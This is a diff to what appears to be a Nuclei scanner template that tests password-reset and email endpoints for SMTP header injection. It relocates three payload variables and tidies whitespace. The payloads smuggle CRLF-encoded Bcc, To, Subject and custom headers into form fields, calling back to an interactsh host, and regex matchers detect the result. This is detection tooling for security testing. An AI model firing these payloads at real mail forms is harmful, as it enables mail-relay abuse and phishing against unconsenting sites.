@@ -24,6 +24,13 @@ variables:
   callback_url: "{{interactsh-url}}"
   relay_id: "{{randstr}}"
   test_email: "test-{{randstr}}@{{interactsh-url}}"
+  # SMTP Header Injection Payloads
+  smtp_header_payload_email: |
+    test@example.com%0d%0aBcc: {{test_email}}%0d%0aX-Mailer: HeaderInjection-{{relay_id}}%0d%0aX-Callback: {{callback_url}}/email-header-{{relay_id}}
+  smtp_header_payload_subject: |
+    Test Subject%0d%0aBcc: {{test_email}}%0d%0aX-Injected-Subject: {{relay_id}}%0d%0aX-Callback-Subject: {{callback_url}}/subject-header-{{relay_id}}
+  smtp_header_payload_message: |
+    Test message content.%0d%0a%0d%0aTo: {{test_email}}%0d%0aSubject: Injected Email via {{relay_id}}%0d%0aX-Callback-Message: {{callback_url}}/message-header-{{relay_id}}%0d%0a%0d%0aThis email was injected via SMTP header injection vulnerability.
 
 http:
   - method: POST
@@ -83,21 +90,10 @@ http:
         "reply_to": "{{smtp_header_payload_email}}"
       }
 
-variables:
-  # SMTP Header Injection Payloads
-  smtp_header_payload_email: |
-    test@example.com%0d%0aBcc: {{test_email}}%0d%0aX-Mailer: HeaderInjection-{{relay_id}}%0d%0aX-Callback: {{callback_url}}/email-header-{{relay_id}}
-
-  smtp_header_payload_subject: |
-    Test Subject%0d%0aBcc: {{test_email}}%0d%0aX-Injected-Subject: {{relay_id}}%0d%0aX-Callback-Subject: {{callback_url}}/subject-header-{{relay_id}}
-
-  smtp_header_payload_message: |
-    Test message content.%0d%0a%0d%0aTo: {{test_email}}%0d%0aSubject: Injected Email via {{relay_id}}%0d%0aX-Callback-Message: {{callback_url}}/message-header-{{relay_id}}%0d%0a%0d%0aThis email was injected via SMTP header injection vulnerability.
-
   - method: POST
     path:
       - "{{BaseURL}}/reset-password"
-      - "{{BaseURL}}/forgot-password" 
+      - "{{BaseURL}}/forgot-password"
       - "{{BaseURL}}/password-reset"
 
     headers:
@@ -243,7 +239,7 @@ variables:
           - "X-Mailer:\\s*HeaderInjection-([a-z0-9]+)"
         group: 1
 
-      - type: regex  
+      - type: regex
         part: interactsh_request
         regex:
           - "X-Injected-Subject:\\s*([a-z0-9]+)"
